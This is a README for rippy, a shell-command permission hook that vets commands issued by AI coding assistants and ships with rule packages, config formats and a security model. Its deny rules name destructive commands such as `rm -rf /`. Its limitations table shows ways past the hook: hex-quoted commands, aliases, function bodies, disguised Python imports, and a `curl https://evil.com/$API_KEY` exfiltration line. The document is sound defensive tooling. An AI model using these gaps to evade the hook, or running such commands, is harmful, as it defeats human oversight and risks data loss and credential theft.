# rippy

[![Crates.io](https://img.shields.io/crates/v/rippy-cli.svg)](https://crates.io/crates/rippy-cli)
[![CI](https://github.com/mpecan/rippy/actions/workflows/ci.yml/badge.svg)](https://github.com/mpecan/rippy/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

A fast shell command safety hook for AI coding tools — written in Rust.

**Docs & homepage:** https://rippy.pecan.si

rippy intercepts shell commands from **Claude Code**, **Cursor**, **Gemini CLI**, and **Codex CLI**, parses them with [rable](https://crates.io/crates/rable) (a pure-Rust bash parser), and automatically approves safe commands while blocking dangerous ones.

**Fully inspired by [Dippy](https://github.com/ldayton/Dippy) by [@ldayton](https://github.com/ldayton)** — rippy is a Rust rewrite with drop-in config compatibility, faster startup, and no runtime dependencies.

## Why rippy?

| | Dippy | rippy |
|---|---|---|
| Language | Python | Rust |
| Runtime | Python 3.9+, pip | Single static binary |
| Startup | ~200ms | <1ms |
| Parser | bash-parser (Parable) | [rable](https://crates.io/crates/rable) (pure Rust) |
| Config | `.dippy` (flat) | `.rippy.toml` (structured; reads legacy `.rippy` / `.dippy` too) |
| Handlers | ~50 commands | 100+ commands |
| File analysis | — | Reads `.py`, `.sql`, `.sh`, `.awk`, `.graphql` for informed decisions |
| CC permissions | — | Reads Claude Code `settings.json` allow/deny/ask rules |

## Install

### Homebrew (macOS/Linux)

```bash
brew install mpecan/tools/rippy
```

### Cargo

```bash
cargo install rippy-cli
```

### cargo-binstall (prebuilt binaries)

```bash
cargo binstall rippy-cli
```

### GitHub Releases

Download prebuilt binaries from [Releases](https://github.com/mpecan/rippy/releases) for:
- macOS (Apple Silicon, Intel)
- Linux (x86_64, aarch64)

## Quick Start

### Claude Code

Add to `~/.claude/settings.json` (or `.claude/settings.json` in your project):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "rippy --mode claude" }]
      }
    ]
  }
}
```

### Cursor

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "rippy --mode cursor" }]
      }
    ]
  }
}
```

### Gemini CLI

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "rippy --mode gemini" }]
      }
    ]
  }
}
```

That's it. rippy reads JSON from stdin and returns a verdict on stdout. Your AI tool handles the rest.

## Packages

Packages are preconfigured safety profiles. Pick one that matches how you work:

```
  review      [===]     Full supervision. Every command asks.
  develop     [==.]     Auto-approves builds, tests, VCS. Asks for destructive ops.
  autopilot   [=..]     Maximum AI autonomy. Only catastrophic ops are blocked.
```

Set up with interactive package selection:

```bash
rippy init
```

Or specify directly:

```bash
rippy init --package develop
```

Manage packages anytime with `rippy profile`:

```bash
rippy profile list              # see all packages (built-in + custom)
rippy profile show develop      # see what a package does
rippy profile set autopilot     # switch packages
```

Packages are a starting point — layer your own rules on top. See the [Packages wiki](https://github.com/mpecan/rippy/wiki/Packages) for full details on what each package auto-approves, asks, and blocks.

### Custom packages

Create your own packages in `~/.rippy/packages/<name>.toml` using the same
TOML format. Use `extends = "develop"` (or another built-in) in the `[meta]`
section to inherit rules from a built-in base and layer your own on top:

```toml
# ~/.rippy/packages/backend-dev.toml
[meta]
name = "backend-dev"
tagline = "Go + Postgres + K8s workflow"
extends = "develop"

[[rules]]
action = "allow"
command = "kubectl"
subcommands = ["get", "describe", "logs"]

[[rules]]
action = "deny"
pattern = "kubectl delete"
message = "destructive — run manually"
```

Then activate it like any built-in:

```bash
rippy profile set backend-dev
# or: set  package = "backend-dev"  in [settings]
```

Custom packages appear in `rippy profile list` under a "Custom packages:"
section and work with `rippy profile show <name>`. Built-in names
(`review`, `develop`, `autopilot`) always take priority — if a custom file
shadows one, rippy uses the built-in and prints a warning.

## How It Works

```
stdin (JSON) → parse command → AST analysis → evaluate rules → verdict (JSON) → stdout
```

1. Reads a JSON hook payload from stdin
2. Detects the AI tool mode (or uses `--mode`)
3. Checks Claude Code permission rules (`settings.json` allow/deny/ask)
4. Checks user config rules (`.rippy` files)
5. Parses the command into an AST with [rable](https://crates.io/crates/rable)
6. Evaluates against built-in safety rules and 100+ CLI-specific handlers
7. For file-referencing commands (`python script.py`, `psql -f query.sql`, `bash script.sh`), reads and analyzes file contents
8. Returns a JSON verdict on stdout

**Exit codes:** `0` = allow, `2` = ask/deny, `1` = error

## What Gets Auto-Approved?

rippy has **130+ commands** in its safe allowlist (read-only tools like `cat`, `ls`, `grep`, `jq`, `rg`, etc.) plus **40+ CLI-specific handlers** that understand subcommand safety:

| Command | Safe | Needs approval |
|---------|------|----------------|
| `git` | `status`, `log`, `diff`, `branch` | `push`, `reset`, `rebase` |
| `docker` | `ps`, `images`, `logs` | `run`, `exec`, `rm` |
| `cargo` | `test`, `build`, `check`, `clippy` | `run`, `publish`, `install` |
| `python` | `-c 'print(1)'`, safe scripts | `-c 'import os'`, unknown scripts |
| `kubectl` | `get`, `describe`, `logs` | `apply`, `delete`, `exec` |
| `psql` | `-c 'SELECT ...'`, read-only `.sql` files | write SQL, interactive |
| `gh` | `pr view`, `issue list` | `pr create`, `pr merge` |
| `ansible` | `--check`, `--syntax-check`, `ansible-doc` | playbook runs, vault encrypt |

**Default for unknown commands: Ask** (fail-safe).

## Configuration

The easiest way to get started is with a package (see [Packages](#packages) above). For full control, rippy loads config from these tiers (lowest to highest priority):

1. **Built-in stdlib:** safe allowlist + 100+ CLI handlers
2. **Package:** `package = "develop"` in settings (optional, loaded from built-in TOML)
3. **Global config:** `~/.rippy/config.toml` (flat `~/.rippy/config` / `~/.dippy/config` also read for backward compatibility)
4. **Project config:** `.rippy.toml` walked up from cwd (flat `.rippy` / `.dippy` also read)
5. **Environment:** `RIPPY_CONFIG` or `DIPPY_CONFIG` env var

Additionally, **Claude Code settings** (`~/.claude/settings.json` → `permissions.allow/deny/ask`) are checked as a separate pre-analysis step before config rules are evaluated.

### Config format: `.rippy.toml` is preferred

Write new configs as **`.rippy.toml`**. TOML is where new features land — structured matching (`command` / `subcommand` / `flags` / `args-contain`) is TOML-only, and `rippy init`, `rippy allow`, `rippy deny`, and `rippy ask` all write to `.rippy.toml`.

```toml
[settings]
default = "ask"
package = "develop"    # start with a safety package

# Block dangerous commands with guidance
[[rules]]
action = "deny"
pattern = "rm -rf /"
message = "Never delete the root filesystem"

# Structured matching — pins the rule to `git push --force`
# without relying on prefix tricks
[[rules]]
action = "deny"
command = "git"
subcommand = "push"
flags = ["--force"]
message = "Use --force-with-lease instead"

# Allow specific safe patterns
[[rules]]
action = "allow"
pattern = "git status"

# Redirect rules (block writes to sensitive paths)
[[rules]]
action = "deny-redirect"
pattern = "**/.env*"
message = "Do not write to environment files"
```

Starter configs live in [`examples/`](examples/): [`recommended.rippy.toml`](examples/recommended.rippy.toml), [`review.rippy.toml`](examples/review.rippy.toml), [`autopilot.rippy.toml`](examples/autopilot.rippy.toml).

The legacy **flat `.rippy` / `.dippy` format** (one rule per line, inherited from Dippy) is still loaded, so existing configs keep working. It can't express structured matching; run `rippy migrate` to convert a flat file to `.rippy.toml`. See [`examples/recommended.rippy`](examples/recommended.rippy) for a flat example and the [docs](https://rippy.pecan.si/configuration/rules/) for the full grammar.

### Rule types

| TOML `action` | Description |
|--------|-------------|
| `allow` / `ask` / `deny` | Command rules (match via `pattern` or structured fields) |
| `allow-redirect` / `ask-redirect` / `deny-redirect` | Redirect rules — gate writes to sensitive paths |
| `after` | Post-execution feedback message |
| `allow-mcp` / `ask-mcp` / `deny-mcp` | MCP tool rules |

Plus `[settings]` (`default`, `log`, `log-full`, `package`) and `[[aliases]]` (`source` / `target`). Any rule can also carry a `when = { … }` clause to gate it on runtime context (git branch, cwd, env var, file existence, or an external command) — see the [Conditional rules section](https://rippy.pecan.si/configuration/rules/#conditional-rules) for the full grammar.

### Pattern matching

- Default: **prefix matching** — `git` matches `git status`, `git push`, etc.
- `*` matches any characters, `?` matches one, `[abc]` character class, `**` globstar
- Trailing `|` forces **exact matching** — `git|` only matches bare `git`

## CLI Commands

| Command | Description |
|---------|-------------|
| `rippy --mode claude` | Run as a hook (reads JSON from stdin, returns verdict) |
| `rippy init` | Initialize config with interactive package selection |
| `rippy profile list` | List available safety packages |
| `rippy profile show <name>` | Show details of a safety package |
| `rippy profile set <name>` | Activate a safety package |
| `rippy inspect [command]` | Show configured rules or trace a command decision |
| `rippy debug <command>` | Trace the full decision path for a command |
| `rippy list safe` | List all auto-approved safe commands |
| `rippy list handlers` | List commands with dedicated handlers |
| `rippy list rules` | Show effective rules from all config sources |
| `rippy allow <pattern>` | Add an allow rule to config |
| `rippy deny <pattern>` | Add a deny rule to config |
| `rippy ask <pattern>` | Add an ask rule to config |
| `rippy suggest` | Analyze tracking data and suggest config rules |
| `rippy stats` | Show aggregate decision tracking statistics |
| `rippy trust` | Manage trust for project-level config files |
| `rippy setup claude-code` | Install rippy as a hook for Claude Code |
| `rippy setup gemini` | Install rippy as a hook for Gemini CLI |
| `rippy setup cursor` | Install rippy as a hook for Cursor |
| `rippy setup tokf` | Configure [tokf](https://github.com/mpecan/tokf) to use rippy as its permission engine |
| `rippy discover <cmd>` | Discover flag aliases from command help output |
| `rippy migrate` | Convert `.rippy` config to `.rippy.toml` format |

## Migrating from Dippy

rippy reads `.dippy` config files and the `DIPPY_CONFIG` environment variable automatically. To migrate:

1. Install rippy
2. Replace `dippy` with `rippy --mode claude` in your hook config
3. Your existing `.dippy` config files work as-is

Optionally rename `.dippy` → `.rippy` and `~/.dippy/config` → `~/.rippy/config`.

## Integration with tokf

rippy works as a permission engine for [tokf](https://github.com/mpecan/tokf) (a CLI output compressor for LLM context). When paired together, tokf handles output compression while rippy handles permission decisions.

See [tokf's external permission engine docs](https://github.com/mpecan/tokf#external-permission-engine) for setup.

## Security Model

rippy is a **permission system** — it adds friction before dangerous commands execute. It is **not** a sandbox, container, or security boundary.

### What rippy protects against

- **Auto-execution of dangerous commands** — `rm -rf /`, `dd`, `chmod 777`, etc. are blocked or require approval
- **Unsafe subcommand usage** — `git push --force`, `docker run`, `kubectl delete` require approval even though `git status` and `docker ps` are auto-approved
- **File overwrites** — redirect rules block writes to `.env`, `/etc/*`, and other sensitive paths
- **Blind script execution** — Python, SQL, shell, and AWK files are read and analyzed for dangerous patterns before execution
- **Unknown commands** — anything not in the safe allowlist or handled by a specific handler defaults to "ask"

### What rippy does NOT protect against

| Limitation | Impact | Mitigation |
|---|---|---|
| **Variables not evaluated** | `rm $VAR` is analyzed without knowing `$VAR`'s value | rippy conservatively asks when variable expansions are detected |
| **Shell aliases invisible** | Aliases defined in `.bashrc`/`.zshrc` bypass analysis | Only rippy config-defined aliases are resolved |
| **Quote handling is structural** | ANSI-C quoting (`$'\x72\x6d'`) is not normalized | The parser handles standard quoting; exotic forms may pass through |
| **File analysis is heuristic** | `import os as system` in Python is not caught | Dangerous patterns trigger "ask" (human review), not silent "allow" |
| **Credential exfiltration** | `curl https://evil.com/$API_KEY` uses a legitimate command | rippy is command-aware, not data-aware; use network egress controls |
| **Function definitions** | `f() { rm -rf /; }; f` — function bodies are not analyzed | Function definitions trigger "ask" conservatively |

### Project config trust

Project-level `.rippy` config files (in cloned repos) could weaken protections if loaded unconditionally. rippy uses a **trust model** to prevent this:

- **Untrusted by default** — project configs in new repos are ignored until you run `rippy trust`
- **Repo-level trust** — once you trust a repo, config changes via `git pull` are auto-trusted
- **Hash verification** — if the config is modified outside of git (or in an untrusted repo), trust is revoked
- **Self-protection** — AI tools cannot modify rippy's config files or trust database
- **Global override** — `trust-project-configs = true` in `~/.rippy/config.toml` opts into auto-trust for all project configs

See the `rippy trust` command for details.

### In summary

rippy prevents **accidental damage** from AI-generated commands by requiring explicit approval for anything dangerous. It is most effective as part of a defense-in-depth strategy alongside branch protection, secret detection, and network egress controls.

## Contributing

Contributions welcome! rippy follows these conventions:

- **Commits:** [Conventional Commits](https://www.conventionalcommits.org/) (`feat:`, `fix:`, `test:`, etc.)
- **Quality:** `cargo fmt && cargo clippy --all-targets -- -D warnings && cargo test` must pass
- **Testing:** Every feature needs unit tests and integration tests
- **Limits:** 100-char lines, 60-line functions, cognitive complexity ≤ 15

## Acknowledgments

rippy is a Rust rewrite of [Dippy](https://github.com/ldayton/Dippy) by [@ldayton](https://github.com/ldayton). The original Python implementation pioneered the concept of AI tool command safety hooks. rippy maintains full config compatibility with Dippy.

The bash parser is [rable](https://crates.io/crates/rable), a pure-Rust parser with 100% [Parable](https://github.com/ldayton/Parable) test compatibility.

## License

MIT
